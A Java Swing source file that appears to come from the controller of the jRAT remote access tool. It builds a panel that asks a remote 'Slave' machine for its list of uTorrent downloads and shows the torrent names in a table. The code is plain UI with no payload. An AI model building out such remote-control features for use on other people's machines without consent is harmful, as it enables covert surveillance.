package io.jrat.controller.ui.panels;

import iconlib.IconUtils;
import io.jrat.controller.Slave;
import io.jrat.controller.packets.outgoing.Packet57UTorrentDownloads;
import io.jrat.controller.ui.components.TableModel;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;

import jrat.api.ui.DefaultJTable;


@SuppressWarnings("serial")
public class PanelControluTorrentDownloads extends PanelControlParent {

	private JTable table;
	private TableModel model;
	private ImageIcon icon = null;

	public TableModel getModel() {
		return model;
	}

	public ImageIcon getIcon() {
		if (icon == null) {
			icon = IconUtils.getIcon("utorrent");
		}
		return icon;
	}

	public PanelControluTorrentDownloads(Slave slave) {
		super(slave);
		final Slave sl = slave;

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnRefreshList = new JButton("Refresh list");
		btnRefreshList.setIcon(IconUtils.getIcon("update"));
		btnRefreshList.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				while (model.getRowCount() > 0) {
					model.removeRow(0);
				}
				sl.addToSendQueue(new Packet57UTorrentDownloads());
			}
		});

		JButton btnClear = new JButton("Clear");
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				while (model.getRowCount() > 0) {
					model.removeRow(0);
				}
			}
		});
		btnClear.setIcon(IconUtils.getIcon("clear"));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 599, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(btnRefreshList).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear))).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 300, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnRefreshList).addComponent(btnClear)).addContainerGap(16, Short.MAX_VALUE)));

		table = new DefaultJTable() {
			@SuppressWarnings({ "unchecked", "rawtypes" })
			@Override
			public Class getColumnClass(int column) {
				if (column == 0) {
					return ImageIcon.class;
				}
				return super.getColumnClass(column);
			}
		};
		table.setModel(model = new TableModel(new Object[][] {}, new String[] { " ", "Torrent Name" }));
		table.getColumnModel().getColumn(0).setPreferredWidth(20);
		table.getColumnModel().getColumn(1).setPreferredWidth(545);
		table.setRowHeight(20);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);
	}
}
